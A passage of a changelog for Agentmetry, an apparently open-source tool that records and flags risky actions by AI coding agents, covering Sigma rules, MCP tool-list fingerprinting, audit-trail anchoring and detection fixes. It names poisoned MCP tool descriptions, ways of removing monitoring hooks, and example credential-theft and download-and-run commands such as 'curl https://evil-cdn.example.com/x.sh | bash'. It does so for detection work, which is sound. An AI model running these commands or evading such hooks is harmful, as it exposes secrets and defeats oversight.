  Sentinel team that wanted to alert on `credential-exfil` had to write the
  search themselves from a schema document, which is a strange gap for a project
  whose claim is that your SIEM stays the console. If the console is theirs, the
  content has to be portable.

  The rules are generated by `tools/generate_sigma_pack.py`, which replays the
  benchmark corpus through the real engine and reads the `Detection` objects it
  emits. Hand-writing fifteen would put rule ids, severities and MITRE ids in a
  second place that drifts from the first, which is the failure this repository
  keeps finding in its own documents. A severity that changes in the rules
  changes here on the next run, and a test fails if nobody reruns it.

  Sixteen files for fifteen rule ids, and the extra one is a real finding.
  `encoded-command-download` emits two severities deliberately: critical for
  remote code fetched and executed, low for local content piped into an
  interpreter. Keying the pack on rule id alone produced one rule at whichever
  severity the corpus yielded first, claiming critical while some firings are
  low. Each severity now gets its own rule, pinned on `action.outcome`. One
  static level would either page on the quiet variant or stay silent on the loud
  one.

  Five tests hold it: every built-in rule has a Sigma rule, no Sigma rule
  outlives a deleted one, severities match what the engine emits, the documents
  are valid Sigma, and the UUIDs are derived from the rule id rather than random
  so regenerating does not churn an id a consumer pinned. Closes
  [#6](https://github.com/blitzcrieg1/agentmetry/issues/6).

  The two rules with no corpus case, `host-subagent-swarm-burst` and
  `off-hours-activity`, carry an explicit entry in the generator with the reason.
  That table is checked against `BUILTIN_RULE_IDS` rather than trusted: a
  sixteenth rule with neither a corpus case nor an entry fails the script instead
  of silently shipping a pack that claims more than it has.

- **The initialize handshake is recorded, so a release can be told from a rug
  pull.** `serverInfo.version` and `capabilities.tools.listChanged` cross the
  wire on every MCP session and were being discarded. Both are now attached to
  the schema fingerprint event.

  The digest moving is ambiguous on its own. Digest moved and server version
  moved usually means somebody shipped a release. Digest moved and version
  identical is the shape worth looking at first. The Sigma rule previously told
  an analyst to go and read a changelog; the version string is the handle that
  makes that check something a machine can do.

  Said plainly in the code and repeated here: the version is attacker
  controlled. It separates ordinary churn from suspicious churn and it is not a
  security boundary. `listChanged` is captured for the inverse case, a server
  that promised to send `notifications/tools/list_changed`, changed its list,
  and stayed silent.

- **A schema move now names the tool that moved.** Each tool gets its own digest
  alongside the whole-listing digest, so an alert can say which tool changed
  rather than only which server. Tools added and removed come through as counts.

  The obvious way to answer "why did this fire" is to store the listing itself.
  That would mean writing a poisoned tool description into the trail and then
  forwarding it to a SIEM, which is storing the payload. So the answer is a hash
  per tool instead: enough to point at one tool and reach for an inspector,
  never enough to carry the attack. The id is a hash of the tool name for the
  same reason server names are hashed, since a tool called
  `internal-payroll-export` is itself information.

  Requested by the first external tester to run the sensor, and shipped inside
  the week he agreed to test it. Closes
  [#120](https://github.com/blitzcrieg1/agentmetry/issues/120).

### Fixed

- **A failed `tools/list` is no longer silent, and an empty one no longer
  poisons the baseline.** Two false-positive roads, both closing
  [#106](https://github.com/blitzcrieg1/agentmetry/issues/106).

  A listing that errors partway already had its accumulated pages dropped, which
  stopped a retry hashing to a fingerprint no server ever served. But nothing was
  recorded, and silence is not the same as unknown: an operator reading a quiet
  week could not tell a server that never moved from one nobody managed to read.
  A failed listing now emits an explicit `unavailable` event and leaves the
  stored baseline exactly where it was.

  The second road arrives through a success. A registry that intermittently
  answers with no tools, or a server listed before it finished starting, wrote an
  empty baseline. The next healthy listing then differed from it and was reported
  as a change, which labels a server coming up correctly as a rug pull. Growing
  out of an empty baseline is now a first sighting. Deliberately one way: going
  from a populated listing to an empty one is still a change, because tools
  actually disappearing is the thing this watches for.

- **Splunk disposition searches joined on the wrong key.** The saved searches
  matched dispositions to detections by `correlation_id` alone, so a session with
  two findings had one disposition close both. The join is now
  `correlation_id::rule_id`.

- **Seven CodeQL findings, and the log sanitizer rewritten so CodeQL can follow
  it.** The first fix used `encode("unicode_escape")`, which is correct and which
  static analysis could not trace through, leaving the alerts open. Replaced with
  an explicit chain of `.replace()` calls.

### Changed

- **Dashboard on Next 16, React 19, with eslint 9 flat config.** Driven by
  dependency advisories rather than by any feature. `next lint` was removed in
  Next 16 and fails with a message about an invalid project directory, which
  reads like a broken path rather than a deleted command, so `package.json` now
  calls eslint directly. Twelve `react-hooks/set-state-in-effect` sites are
  downgraded to warnings and tracked in
  [#95](https://github.com/blitzcrieg1/agentmetry/issues/95) rather than
  refactored inside a framework migration.

- **`README.md` states what the MCP fingerprint does not prove.** A reviewer
  pointed out that a quiet digest reads as a claim that the server is safe. It is
  a tripwire. A server can hold its listing identical and change what a tool does
  at call time, and that is now written down instead of implied.

- **The attribution paragraph in `README.md` was corrected, having overstated the
  weakness.** It claimed a key holder could post events asserting any `host_id`,
  `fleet_id` and user identity. The ingest body has no identity fields and they
  are stamped by the receiving host. Four separate reviews repeated the error
  back before anyone checked the code. Three tests now pin the behaviour.

## [0.5.0] - 2026-08-21

### Added

- **Coverage attestation on a heartbeat.** A hook lives in a file the developer
  owns: `.cursor/hooks.json` can be deleted, `claude --no-hooks` skips it, the
  orchestrator can be stopped. No user-space recorder prevents that, and the
  honest answer to "what stops my developer removing this" is that removal
  changes what the recorder says about itself.

  "Alert when a machine stops sending events" does not work, because idle and
  disabled both emit nothing and silence is not evidence. So the recorder
  attests on an interval whether or not anybody is coding, and carries what it
  is wired to rather than only a timestamp. The beat covers every agent surface
  that has an installer, in four states rather than a boolean, because "the hook
  was removed" and "this agent was never installed here" deserve opposite
  responses. A fleet that learns the tamper signal is always on has no tamper
  signal left.

  Each beat also carries `trail_merkle_root` and `trail_tree_size`, so a root
  lands in the SIEM on an interval, outside the audited machine's blast radius.
  An edit below that tree size then produces a root that no longer matches a
  value the machine can no longer reach. Measured at 646ms over 17,480 records,
  a 0.2% duty cycle at the default 300s beat.

- **`agentmetry mcp`**: an inventory of what the agents on this machine are
  wired to. Agentmetry recorded what an agent did and could not answer the
  question a security reviewer asks first, which is what that agent was allowed
  to reach. `doctor` reports it too.

- **MCP schema fingerprinting**, because the config digest cannot see a rug
  pull. `mcp_config_digest` hashes the configured command line, which catches
  "somebody added an MCP server on that laptop" and misses the attack that
  matters: `postmark-mcp` shipped fifteen clean versions and then changed what
  `tools/list` returned. The payload lives in the description the model is
  handed and never appears in `mcp.json`.

  The beat now carries a digest over every observed `tools/list` beside the
  config digest, so the SIEM rule is a conjunction: schema digest moved, config
  digest did not. No new detection rule, so the frozen ruleset and the dogfood
  gate are untouched.

  The recorder does not spawn servers to collect this. `npx -y` on a five minute
  beat would fetch and run whatever the registry currently serves, which is the
  attack, performed by the recorder. Until a client has listed tools the digest
  is empty, which is an honest gap rather than a green dashboard.

- **Google SecOps forwarding as UDM** rather than raw logs. Posting to
  `unstructuredlogentries` would require a normalization parser in the
  customer's tenant: a second implementation of this mapping, in another
  language, versioned separately. When the two drift the failure is silent,
  because events keep arriving and quietly stop populating the fields the
  detections key on. This posts UDM directly to `udmevents`, which is also
  Google's own guidance.

- **The ATT&CK classification now lands in ECS `threat.*`**, the fieldset
  Elastic's prebuilt content and Navigator coverage layers actually join on. It
  had only ever been written into the vendor namespace, so a customer's existing
  ATT&CK dashboards saw nothing. `threat.framework` is always `MITRE ATT&CK`
  there; ATLAS ids deliberately do not enter that fieldset.

- **MITRE ATLAS labels on the AI-specific subset**, for the half of the threat
  model ATT&CK has no id for. Tool-level mappings for credential access, egress
  and destruction; `AML.T0109` on the MCP rug-pull signature; and a
  detection-level block on `untrusted-input-then-risky-action`
  (`AML.T0051.001`, indirect prompt injection). Ids are resolved by name against
  ATLAS 2026.07, format 6.0.0, rather than hardcoded, which caught two mistakes
  during authoring. Optional YAML override with id validation. Five techniques
  out of 178, published as five out of 178.

- **`agentmetry hooks status`**: coverage as an exit code, for Intune
  Remediations and every scheduled check shaped like it. Parsing `doctor` output
  worked until somebody reworded a line, and a fleet coverage check that breaks
  silently on a wording change is worse than no check.

      0  every agent present here is recorded, or none is installed
      1  an agent is present and not recorded, and installing hooks fixes it
      2  coverage cannot be determined, and installing hooks does not fix it

  2 is deliberately not folded into either neighbour: a service profile sees no
  developer configuration at all, calling that compliant is the lie this
  subsystem exists to prevent, and calling it remediable loops forever against
  something an install cannot fix.

- **A Codex installer**, the one supported agent that never had one. It writes
  absolute paths like every other installer and merges non-destructively into
  `~/.codex/hooks.json`. Deliberately not wired into boot: Codex trusts hooks by
  hash and skips untrusted ones silently, so an install nobody asked for would
  sit there looking installed and capturing nothing. Installing Codex is a
  decision with a step only a human can complete, and the script says so.

- **Capture that does not require a git checkout.** An MSI machine ran the
  recorder, captured nothing, and nothing said so. Ingest lived only at
  `scripts/agentmetry_ingest.py`; the MSI ships a frozen binary and no repo, so
  the command a hook config named did not exist on the machine. Every installer
  checked for that file, did not find it, and declined. Service up, dashboard
  green, zero tool calls recorded, which is the silent-coverage failure this
  product exists to detect, shipped inside the product.

  The module moved into the package as `agentmetry.hooks.ingest` so it travels
  in the wheel and in the frozen binary. `scripts/agentmetry_ingest.py` stays
  forever and forwards, because hooks already installed on developer machines
  name it by absolute path and those configs are not ours to rewrite.

- **Detection**: secret-manager CLIs and single-quoted inline scripts are now
  recognised.

- **External anchoring for the trail** (`agentmetry anchor`), closing the gap
  [#34](https://github.com/blitzcrieg1/agentmetry/issues/34) named. The hash
  chain and the Merkle root are both computed on the audited machine from the
  audited file, so an attacker with write access to the data directory can edit
  an event, recompute every hash after it, rewrite the sidecar head, and hand
  over a trail that verifies cleanly. That is the ceiling of what a
  self-contained file can prove about itself.

  A checkpoint commits `(tree_size, root_sha256)` to somewhere the host does not
  control; any later edit below that size stops matching. The trail never
  leaves, because a Merkle root over hashes discloses nothing about the events.

  `AnchorSink` is a one-method protocol. This repo ships `FileAnchorSink` (a
  local append-only log) and documents attaching a git remote, an RFC 3161
  timestamp authority, or WORM storage in [anchoring](docs/anchoring.md).
  Choosing an anchor means choosing whom you trust to hold history, and picking
  one on the operator's behalf would be making that decision for them.

- `verify --trail --anchors <path>` checks against an anchor log somewhere other
  than beside the trail, `AGENTMETRY_ANCHOR_LOG` sets that path once so neither
  `verify` nor `doctor` needs the flag, and `scripts/publish_anchor.ps1` runs the
  whole loop (checkpoint, commit, push, verify against the published copy) on a
  schedule. An operator who has to remember a flag to get the real check is an
  operator who will end up running the fake one.

  `doctor` reports coverage, fails hard when the trail contradicts a published
  anchor, and stays **silent** when no anchor log is configured. An unanchored
  trail is a legitimate configuration and the chain still does real work; a
  daily warning about it would be a nag about a choice, and nags are what teach
  an operator to stop reading the report. A *configured* log that has gone
  missing does warn, because that is an intention that stopped working rather
  than a decision.

  Without `--anchors` the check compares the trail to a log an attacker who
  rewrote one had every opportunity to rewrite as well, which establishes that a
  file agrees with itself.

  Agentmetry's own trail is now anchored at
  [agentmetry-anchors](https://github.com/blitzcrieg1/agentmetry-anchors) with
  force-push and deletion blocked. Note that GitHub offers branch protection
  free on public repositories and behind a paid plan on private ones, so an
  unprotected private anchor repo is the failure mode to avoid: the workstation
  in this threat model holds the credential that can rewrite it.

### Fixed

- **Seven installers pointed at a path deleted in 0.4.0, and reported success.**
  Every installer delegating to `hook_bootstrap` invoked a path that stopped
  existing when the package moved under `agentmetry/`. It went unnoticed because
  Cursor and Claude self-install at boot, so the two agents anyone would test
  kept working, while Qwen, Kimi, Qoder and CodeBuddy have no other install path
  and were simply unreachable.

  The failure shape mattered more than the path. `$ErrorActionPreference =
  "Stop"` does not trip on a native command's exit code, so python printed
  "can't open file", returned 2, and the script carried on to announce that
  hooks were merged. A developer ran the installer, was told they were covered,
  and had none. Both halves are fixed.

- **Codex and Antigravity were reported as unverifiable, and both were wrong.**
  A missing PowerShell installer is not the same fact as missing support, and
  reporting unknown for a surface that can be checked hides a real uncovered
  machine. On the maintainer's own machine the wrong registry reported
  Antigravity absent while it was covered, and Codex unknown while it was
  installed and unrecorded.

- **The heartbeat attested two agent surfaces while six installers shipped.**
  Both the beat and `doctor` hardcoded `~/.cursor` and `~/.claude`, so a machine
  running Codex, Qwen, Kimi, Qoder or CodeBuddy unrecorded still beat green. Two
  copies of the same list, neither compared against anything. The registry now
  lives in one module both callers read, and a test fails if an installer is
  added without a row.

- **One finding, one row.** A detection could be emitted twice for the same
  sequence when an inferred approval event re-ran the engine over a window that
  had already produced it. Findings are now deduplicated per correlation and
  rule within a batch.

- **The hook target that gates the install is now the target that writes the
  command.** The two were derived from different roots, so a check could pass
  against one path while the command written named another.

- **The trail chain locks across processes**, not only across threads. Two
  orchestrator processes appending concurrently could interleave and produce a
  chain that failed its own verification.

- **The canonical form is injective**, so two distinct events cannot produce the
  same record hash.

- **A carriage return is not a ruleset change.** Line-ending normalisation was
  moving the ruleset fingerprint on Windows checkouts, which reset the dogfood
  gate over a whitespace difference.

- **Four detection rules matched command words against raw command text**, so a
  commit message that merely *described* a dangerous command could fire on it.
  Found by triaging a real critical finding rather than by a test: a legitimate
  `.env` read, then six hours later a commit message documenting `az keyvault`
  and `aws secretsmanager` support, produced `credential-read-then-cloud-api`.
  The commit event carried no `cloud_api` trait; the rule bypassed the
  classifier and grepped the text.

  `_CLOUD_API`, `_GIT_EXFIL`, `_DELETE_COMMAND` and `_UNTRUSTED_INPUT_COMMAND`
  now read `_command_words()` (quoted content and heredoc bodies blanked) like
  every other command-word pattern. Raw text is still correct for URLs, IPs,
  file paths and command equality, and `_command()` now says which is which.

  This is the second time the same distinction was got wrong; `_command_words`
  was written for the first. A tool whose own commit messages page its owner is
  a tool whose alerts get muted, so the regression is pinned three ways: unit
  tests per rule, a corpus case replayed from the real session, and one test
  asserting the property against the patterns directly so a fifth call site
  cannot reintroduce it quietly.

### Changed

- **Canonical event schema bumped to 1.2.0**, additively. The `atlas` block on
  detections and the `threat.*` promotion in ECS are both additions; nothing was
  removed or renamed. `SCHEMA_VERSION` had also existed while four builders
  emitted the literal string, so the version now has one source of truth.

- The hook path no longer does filesystem work on every tool call.

- `verify --trail` now reports **anchored and unanchored ranges separately**. A
  checkpoint covers the records that existed when it was published; calling the
  whole trail anchored because one checkpoint exists would overstate it. An
  unanchored tail is not a failure, it is the normal state of a running
  recorder, and scoring it red would make the check cry wolf until somebody
  turned it off. When a checkpoint does not match, a rewritten range and a
  truncated one are reported as the different incidents they are.

- Bare uses of **"tamper-evident"** replaced with the precise claim:
  hash-chained and verifiable, with optional external anchoring for threat
  models that include the host itself. The phrase promised a compliance reader
  more than the file could deliver, and the reader least able to check was the
  one most likely to rely on it.

## [0.4.0] - 2026-08-07

**The first release you can actually `pip install`.** Every earlier version
either was never published or, in 0.3.0's case, would have written `core`, `api`
and `cli` into site-packages. `pip install agentmetry` now works, and
`agentmetry doctor` opens with no failures on a clean install.

Published by a tagged GitHub Actions run using PyPI Trusted Publishing, which
means the artifact is built from a clean checkout of the tag rather than from
whatever happened to be in a laptop's `dist/`. That is not process theatre: the
artifacts nearly published by hand were four days old and carried 20 corpus
files against a tree with 46, missing every detection fix below.

### Added
- **Merkle inclusion proofs over the trail.** The hash chain answers "has this
  file been altered". It cannot answer "did this event happen" without handing
  over the whole file, because every record's hash depends on the one before it.
  For an audit that is the wrong shape: proving one tool call should not
  disclose a month of unrelated work.

  `agentmetry prove <trail> --seq N` emits an RFC 6962 inclusion proof;
  `--check` verifies one, ideally against a root recorded elsewhere. On a real
  trail that is 1.2 KB against 8.3 MB. `verify --trail` now prints the root.

  Additive by construction: leaves are the `record_sha256` values the chain
  already writes, so every trail ever produced is compatible and nothing
  migrates. Leaf and internal nodes are domain-separated (RFC 6962 §2.1) and the
  tree splits at the largest power of two below `n` rather than padding or
  duplicating the final node; without those two properties an internal node can
  be presented as a leaf, and two different logs can share a root.

  It does not solve external anchoring (#34). A root only you hold is still a
  file you could rewrite, and `--check` says so rather than implying otherwise.

- **CloudEvents v1.0 export.** `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=cloudevents`
  wraps each event in a structured envelope for Knative, EventBridge, Event
  Grid, Dapr or Kafka. The canonical event travels whole in `data`. Default
  stays `canonical`, because an option appearing must not change the shape an
  already-wired webhook receives.

- **Ingest Microsoft Agent Governance Toolkit audit files.**
  `agentmetry import-agt <file> --key K` verifies AGT's hash chain and HMAC
  signatures, then runs sequence detection over it. AGT decides allow or deny
  per call; this says what a session of those calls adds up to. On a file
  produced by AGT's own `FileAuditSink`, three individually-permitted calls
  raised one critical `credential-exfil`.

  Verified before ingest, never after: appending an unchecked record into a
  hash-chained trail would make the chain vouch for a claim nobody checked.
  Ingested events carry `source.tier=external` and
  `provenance.captured_by=agent-governance-toolkit`, because Agentmetry read
  that record rather than observing the calls, and a trail that cannot tell the
  difference asserts more than it knows.

- **The dogfood gate now notices when the rules changed underneath it.**
  `dogfood --start` records a fingerprint of everything that decides whether a
  detection fires and how hard: the detection engine, rules, traits and MITRE
  sources, plus the YAML manifest. `dogfood` compares it on every run.

  Three detection changes shipped into week one on the day the clock started.
  Each was an improvement. Together they meant the week measured three different
  products, and nothing said so. The gate exists to produce a number worth
  quoting, and four green weeks measured against four rulesets is not that
  number.

  A drifted ruleset does not turn individual weeks red, because the operator's
  behaviour that week was real. It does stop the run passing, and the report
  names the fix. Whole-file hashing is blunt on purpose: it flags a comment-only
  edit, and it cannot miss a real change. A marker written before fingerprints
  existed is treated as unknown rather than drifted.

- **Spool depth and age are now visible.** `GET /api/v1/audit/status` reports
  `spool_pending` and `spool_oldest_age_seconds`; `doctor` **fails** above 100
  pending or 24h old, naming how long remains before the oldest become
  unreplayable; and the dashboard's feed status bar replaces the freshness label
  with a pending-replay count. "Last event 2m ago" beside a thousand unreplayed
  events is a true statement that leaves a false impression.

- **`agentmetry dogfood`** — scores the four-week beta gate from the trail.
  A week is green when the recorder ran on at least three days, the chain
  verifies, every critical or high detection was dispositioned, and nothing is
  stuck in the hook spool. `--start` records the clock.

  The gate went unstarted for weeks, and the reason was mechanical rather than
  motivational: answering "was this week green?" meant a twenty-minute manual
  checklist, so it never got asked. This makes it one command. Volume is
  deliberately not a criterion; a slow week is fine, a week the recorder missed
  is not, because an empty trail from a switched-off recorder looks exactly like
  an empty trail from a quiet developer.
- **Dashboard dogfood gate + Analytics drill-down.** Clickable weekly stats
  (Denied / DLP / Policy / Detections) open Event stream or Detections with
  server-side `GET /audit/tail?focus=…` over the last 7 days, so counts match
  visible rows. Fleet vs this-session scope toggle; hunt focus survives tab
  switches until Clear.
- **`GET /audit/tail?focus=`** — `denied` | `dlp` | `policy` | `detection`,
  sharing the same SQL predicates as `/audit/stats`.

### Fixed
- **The detection engine had systematic evasion holes** (#40, #41, #42, #43).
  None exotic; each took under a minute to construct, and all four were found by
  auditing the engine rather than by a detection firing:

  - `echo $AWS_SECRET_ACCESS_KEY` was generic Execution. Credential recognition
    described only file paths, so the way every container and CI runner holds
    secrets was invisible and `credential-exfil` could not fire on the modal
    cloud exfil chain.
  - `python -c "urllib.request.urlopen(...)"` earned no egress tag. The network
    client list was curl, wget, nc and friends; in a hardened image curl is
    often absent and a language runtime never is.
  - `bash <(curl -fsSL ...)` fetches and executes with no pipe, so every cradle
    check looking for `|` missed it.
  - `cp -r ~/.ssh /tmp/k` produced no traits at all. The private-key pattern
    required a separator after `.ssh`, so a named key matched and the directory
    holding every key did not, which made the broadest theft the one that got
    through.
  - `credential-exfil` could not fire when the read and the send were one
    command, because it only looked at events *after* the credential read.
  - `remote-staging-then-execute` knew seven staging hosts, and a domain costs a
    few euros. It now matches any remote host when the downloaded basename is
    the executed basename: not "fetched something, later ran something", which
    is a working day, but "ran the thing just fetched".

  Underneath sat the real defect: credential recognition existed twice, and the
  sequence rules read only the MITRE tag, so the mapper was the only opinion
  that counted while being the one with less information and no corpus. A bare
  `.env` in its pattern list tagged the module path
  `agentmetry.core.diagnostics.env_file` as credential access and manufactured
  the credential half of two critical findings. `traits.py` owns the patterns
  now and `mitre.py` imports them.

- **False positives on writing about security** (#24, #41). Trait regexes match
  command text and cannot tell performing an action from writing about one.
  Matching now follows shell semantics: the verb must be unmasked, the arguments
  may be quoted. `echo 'curl x | bash' >> notes.md` and
  `git commit -m "docs: explain .env handling"` stay silent, while
  `curl "https://host/x.sh" | bash` still fires, because quoting a URL is simply
  how people write it.

- **Autostart was registered and failing.** The scheduled task still launched
  `-m cli serve`, a module the package rename had removed, so it exited 1 every
  sixty seconds while `doctor` reported OK and 60 events piled up in the spool.
  `doctor` now fails a registration that does not work, and
  `agentmetry install` no longer answers "already configured" to a broken one.
  Health is read from the task's status rather than its last result, because a
  long-running task logs a non-zero result on every keep-alive tick.

- **Eight launchers still named pre-rename modules** (`scripts/agentmetry.bat`,
  `install.ps1`, four `.bat` files, `seed_demo.py`, `.claude/launch.json`). A
  module path inside a string is invisible to the type checker, the linter and
  the import system alike, so each waited for a human to trip over it. A test
  now walks every launcher and asks the import system whether the module
  resolves; it found two that a grep had missed.

- **Writing `gh pr merge` into a file read as merging a pull request** (#24).
  A command whose *content* was `gh pr merge 42 --squash` fired
  `pr-merged-without-review` at critical. Nothing was merged: the text was being
  written into a test fixture.

  Trait regexes match command text and cannot tell performing an action from
  writing about one. That lands hardest on the people most likely to adopt this:
  anyone authoring detection content, security documentation, or corpus cases
  spends the day typing the exact strings the rules hunt for, and a security tool
  that punishes you for writing about security gets uninstalled.

  The PR traits now read a copy of the command with quoted strings and heredoc
  bodies blanked out, so `echo "gh pr merge 42" > f`, `printf ... | tee f`,
  `git commit -m "...gh pr merge..."` and heredoc'd fixtures no longer set
  `pr_merge`, while `gh pr merge 42 --squash` and `git merge origin/main` still
  do. Masking preserves offsets rather than deleting, so callers can still locate
  a match in the original.

  Applied only to the three PR traits for now. The same confusion exists for
  other text traits, but a general fix means parsing shell quoting properly, and
  each trait wants its own corpus case before its semantics change. Anything the
  heuristic cannot account for stays visible, so the failure mode is a trait that
  still fires rather than one that silently stops.

- **`encoded-command-download` fired critical on piping a loopback service into
  an interpreter** (#38). `curl http://127.0.0.1:8000/... | python` has the exact
  shape of a download cradle and none of the substance, and developers query
  their own services that way several times an hour. A critical that fires that
  often becomes the alert people scroll past, so the rule loses its reader before
  a real cradle ever appears.

  A new `pipe_to_shell_local` trait marks pipes whose every URL is loopback, and
  the rule reports those at low with `T1059` only. No `T1105` and no `TA0011`:
  both mean content arriving from outside, and claiming either for a loopback
  fetch would put a false ATT&CK mapping in front of an analyst. It is downgraded
  rather than suppressed, because staging a payload on a local port and then
  executing it is a real technique.

  Loopback is excluded specifically rather than remote being required, which
  preserves an earlier fix: demanding a bare IP once let
  `curl https://evil-cdn.example.com/x.sh | bash` through, and a domain is what a
  real attacker uses. A command whose URL cannot be read, such as
  `curl $URL | bash`, is treated as remote.

  Corpus gains both halves, and the cradle tests now assert severity rather than
  only that something fired: a careless fix treating every pipe as local would
  otherwise still "detect" a real cradle, at low, and pass.

- **Replayed events were stamped with the time of the replay, not the time of
  the tool call.** The hook sent no timestamp, so the orchestrator fell back to
  its own clock. That is accurate to the millisecond while ingest is live and
  wrong by up to a week when it is not. Draining a five-day spool therefore
  recorded 1,880 events as having happened inside a three-minute window.

  Two consequences, both serious. Every sequence rule keys on "A then B within N
  minutes", so unrelated events days apart became correlated: one drain produced
  twelve detections including two criticals, and reconstruction showed the
  "correlated" sequences actually spanned 4 days 6 hours and 1 day 9.5 hours.
  And a record whose entire purpose is to say when things happened was saying it
  wrongly.

  The hook now stamps `timestamp_utc` at capture, so live and replayed events
  are equally accurate. Replay also backfills from the spool's `spooled_at` for
  entries written by older hooks, and never overwrites a timestamp the hook
  supplied.

- **The hook spool could delete events it had never replayed.** Draining read the
  whole file, replayed it, then unlinked the path. A drain of a few thousand
  events takes minutes and the hooks keep appending throughout, so the unlink
  destroyed everything captured during the drain. The spool is now rotated aside
  first: hooks immediately begin a fresh file and only the rotated copy is ever
  removed. A drain interrupted by a crash resumes from the rotated file instead
  of losing it.

- **The spool drained only at boot, so a backlog could grow unnoticed for days.**
  Nothing supervises the orchestrator on the OSS install path, so hooks kept
  capturing into a spool that nothing came back for. Found in real use: 1,880
  events across five days, still growing, with a dashboard that looked healthy
  because an empty feed and a stopped recorder rendered identically. Draining
  now runs on a timer for as long as the process lives.

- **Boot draining held the ingest port closed.** Awaiting the drain inside the
  application lifespan meant every hook firing during a large drain was refused
  and spooled, making the next drain larger. The boot drain is now a background
  task, so the recorder is reachable first and catches up second.

- **Expired payloads are quarantined rather than discarded.** Payloads past the
  seven-day replay window still cannot be replayed, because injecting a week-old
  tool call into today's correlation window invents sequences that never
  happened. They now move to `hook-spool.expired.jsonl`. A gap in an audit trail
  is a fact about the audit trail, and this product does not get to quietly
  forget one.

- **Autostart was Windows-only, had no restart policy, and told nobody it
  existed.** `agentmetry install` registered a logon task with no recovery, so a
  crashed recorder stayed dead until the next logon; on Linux and macOS it
  printed "Windows-only" and exited. Worse, nothing ever reported whether it had
  been run. On the machine where this was found it never had been, which is how
  five days of capture ended up in the spool behind a healthy-looking trail.

  It now registers a self-healing task on Windows (via a task definition rather
  than the limited `schtasks` flags), a `Restart=always` systemd user unit on
  Linux, and a `KeepAlive` launch agent on macOS. The Windows keep-alive is a
  repeating trigger plus `IgnoreNew`, not `RestartOnFailure`: despite the name,
  that setting covers a task which fails to launch, not one whose process dies
  later. Verified by killing the recorder and watching it come back on its own
  inside a minute.
  `agentmetry uninstall` reverses whichever applies. Packaged builds refuse and
  say why: the installer already supervises them, and a second registration
  would race it. `doctor` now warns when nothing will restart the recorder and
  names the command that fixes it.

### Changed
- **Detection corpus grows from 20 cases to 46** (22 benign, up from 6). Seven
  benign sessions put a 95% confidence bound on the false-positive rate at
  roughly 41%, which is not a rate, and it was the weakest number in the README.
  It is now about 19%. Rule coverage goes from 9 of 15 to 13.

  Every new attack case is paired with the near-miss that must stay silent:
  autonomous writes before an approval against the same writes after one; three
  deletions against the five-deletion threshold; fetch-then-egress against
  fetch-then-edit; downloading a file and running it against downloading a
  schema and running a repo script. A threshold that drifts now breaks a benign
  case instead of surfacing quietly in production.

  `corpus.yaml` states what the number is: a regression guard that the rules
  stay quiet on ordinary work, not a field false-positive rate. The field rate
  is what the dogfood run reports, over traffic nobody chose.

- **Everything moved under one top-level `agentmetry` package, and the
  distribution is now `agentmetry` rather than `agentmetry-orchestrator`.**
  `pip install` previously would have written `core`, `api` and `cli` into
  site-packages: three of the most generic importable names in Python, colliding
  with whatever else claims them. Imports change from `core.audit...` to
  `agentmetry.core.audit...`. Breaking, and the reason this is a minor bump
  rather than a patch.

  The version moves with it. Tag `v0.3.0` points at the old flat layout, so
  publishing 0.3.0 to PyPI would have made one version number mean two different
  trees, and evidence packs record the producing version. `meta.producer` now
  reads `agentmetry/0.4.0`.

  The policy manifests moved inside the package too, for the same reason and
  with a sharper edge: without them DLP, tool policy and the YAML detection
  rules are all inert, so `pip install` produced a `doctor` opening with three
  FAILs and secret scanning silently off. They now live at
  `agentmetry/policies/`. `python -m build` builds the wheel from the sdist, and
  a force-include reaching outside the project directory does not survive that
  trip, so config the package needs to run had to live with the package.

  The detection corpus moved inside the package. `agentmetry benchmark` is the
  command the README tells a stranger to run to check the false-positive claim,
  and it failed from a clean install because the corpus lived under `tests/`,
  which no wheel ships.

## [0.3.0] - 2026-07-26

### Added
- **Detection triage.** Detections now carry a disposition (`new`,
  `acknowledged`, `in_progress`, `resolved`, `false_positive`, `risk_accepted`)
  with an assignee and a note, set from the dashboard or
  `POST /api/v1/audit/detections/disposition`. Every change appends an
  immutable entry to the canonical trail as a `detection_disposition` event, so
  the decision is evidence on the same hash chain as the finding. This closes
  the corrective-action half of ISO/IEC 42001 cl. 10 and EN 18286 cl. 8: the
  compliance digest previously asked for a triage note the product could not
  store.
- **`agentmetry export --compliance-digest`** — a period digest for ISO 42001 /
  EU AI Act evidence review, reporting inferred-approval share, detection
  disposition, control modes and trail-chain state. It states plainly when a
  period evidences detection rather than prevention.
- **Hook event spool.** When the orchestrator is unreachable the hook writes
  events to a local spool (7-day, 32 MB bounded) and the orchestrator drains it
  at boot, so an agent session during a restart is no longer a hole in the
  trail.
- **Unattended-agent policy** (`block_unattended_agent_flags`) — flags such as
  `--yolo` and `--dangerously-skip-permissions` on any binary, plus Hermes,
  OpenHands, aider, goose and opencode coverage in
  `block_agent_cli_weaponization`.
- **Hermes IoC** — `agent_result_dump_dir` DLP rule for the result-dump
  directory used in the July 2026 Hermes agent intrusion.
- **EN 18286:2026 mapping** — [`docs/compliance/en-18286-mapping.md`](docs/compliance/en-18286-mapping.md),
  routed through Annex ZA to EU AI Act Arts. 11, 17 and 72.
- **Open-core extension point.** Commercial packages register through the
  `agentmetry.extensions` entry point; see
  [`docs/architecture/extensions.md`](docs/architecture/extensions.md).
- **Windows CI.** The orchestrator suite runs on `windows-latest` as well as
  `ubuntu-latest`. A Windows-only path bug had already shipped once because CI
  never exercised it.
- **Dashboard tests.** Vitest smoke coverage for the detection, event and
  triage surfaces, run in CI.
- **Detection benchmark** (`agentmetry benchmark`). A corpus of 17 recorded
  sessions, 12 attack and 5 benign, replayed through the real rule engine, with
  expectations written by hand rather than pasted from current behaviour. CI
  fails on any missed rule or any false positive.

  It exists because two real defects shipped past 546 passing tests on
  2026-07-25: sequence ordering decided by a random UUID on a timestamp tie, and
  off-hours detection silently using UTC on Windows. Neither was reachable by a
  unit test that hand-builds events with distinct timestamps in a clean
  environment. Two corpus cases pin exactly those conditions; reintroducing the
  ordering bug makes the benchmark exit non-zero.

  The benign half is the point. A published false-positive count is worth more
  than an asserted detection count, and anyone can reproduce it from a clean
  clone.
- **Sigma rule for untriaged critical detections**
  (`docs/integrations/sigma/agentmetry_critical_detection_untriaged.yml`), with
  the backend anti-join written out for Splunk, Elasticsearch and Loki. An
  untriaged detection is the health metric for the deployment.
- **Fleet guide** — [`docs/integrations/fleet-via-siem.md`](docs/integrations/fleet-via-siem.md):
  running Agentmetry across a team using the SIEM you already operate, with the
  four queries worth alerting on, measured storage sizing, and an explicit
  statement of what it does not give you (no central enforcement, no central
  triage, no visibility into unorchestrated agents).

